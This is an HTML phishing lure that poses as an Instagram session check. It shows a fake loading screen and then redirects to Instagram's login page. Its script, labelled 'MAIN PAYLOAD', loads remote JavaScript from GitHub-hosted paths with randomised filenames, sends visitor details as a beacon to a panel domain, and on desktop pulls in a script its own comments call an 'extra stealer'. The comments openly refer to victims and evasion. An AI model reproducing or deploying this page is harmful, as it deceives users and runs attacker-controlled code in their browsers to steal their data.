<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Loading…</title>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif}
    #loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#fff;display:flex;align-items:center;justify-content:center;flex-direction:column;z-index:9999}
    .spinner{width:48px;height:48px;border:5px solid #333;border-top:5px solid #1d9bf0;border-radius:50%;animation:s 1s linear infinite;margin-bottom:20px}
    @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
    .txt{font-size:18px;opacity:0.9}
    .progress{width:80%;height:4px;background:#222;border-radius:2px;overflow:hidden;margin-top:20px}
    .bar{height:100%;width:0;background:#1d9bf0;animation:p 3s linear forwards}
    @keyframes p{0%{width:0}100%{width:100%}}
    #content{display:none}
  </style>
</head>
<body>
  <div id="loader">
    <div class="spinner"></div>
    <div class="txt">Verifying your session…</div>
    <div class="progress"><div class="bar"></div></div>
  </div>

  <div id="content">
    <!-- Fake login / whatever you want the victim to see after redirect -->
    <script>
      setTimeout(() => {
        window.location.href = "https://www.instagram.com/accounts/login/";
      }, 3500);
    </script>
  </div>

  <!-- MAIN PAYLOAD -->
  <script>
    (function(){
      const d = document;
      const w = window;
      const n = navigator;
      const rand = Math.random().toString(36).substring(2,10);

      // Randomize filenames on every load
      const js1 = `https://cdn.jsdelivr.net/gh/0xKitsune/L/${rand}_a.min.js`;
      const js2 = `https://cdn.jsdelivr.net/gh/0xKitsune/L/${rand}_b.min.js`;
      const beacon = `https://panel.yourpaneldomain.workers.dev/beacon`;

      // Evasion: fake user-agent + headers + timing randomization
      const ua = n.userAgent;
      if(/iPhone|iPad|iPod|Android/i.test(ua)){
        // Mobile-specific persistence
        const s = d.createElement('script');
        s.src = js1 + '?t=' + Date.now();
        s.type = 'text/javascript';
        s.crossOrigin = 'anonymous';
        s.onload = () => {
          const s2 = d.createElement('script');
          s2.src = js2 + '?t=' + Date.now();
          s2.type = 'text/javascript';
          s2.crossOrigin = 'anonymous';
          d.body.appendChild(s2);
        };
        d.body.appendChild(s);

        // Beacon exfil
        setTimeout(() => {
          fetch(beacon, {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify({
              ua: ua,
              ref: d.referrer,
              url: location.href,
              ts: Date.now(),
              ip: "captured_via_worker"
            })
          });
        }, Math.floor(Math.random()*3000)+1000);
      }

      // Desktop fallback (optional extra stealer)
      if(!/mobile/i.test(ua)){
        const extra = d.createElement('script');
        extra.src = `https://raw.githubusercontent.com/0xKitsune/desktop-ext/main/p.js`;
        extra.type = 'text/javascript';
        d.head.appendChild(extra);
      }

      // Clean up loader after 4s
      setTimeout(() => {
        const l = d.getElementById('loader');
        if(l) l.style.display = 'none';
        d.getElementById('content').style.display = 'block';
      }, 4000);
    })();
  </script>

  <!-- Optional: Fake meta tags to look legit -->
  <meta property="og:title" content="Instagram">
  <meta property="og:description" content="Log in to Instagram">
  <meta property="og:image" content="https://www.instagram.com/static/images/ico/favicon-192.png">
</body>
</html>
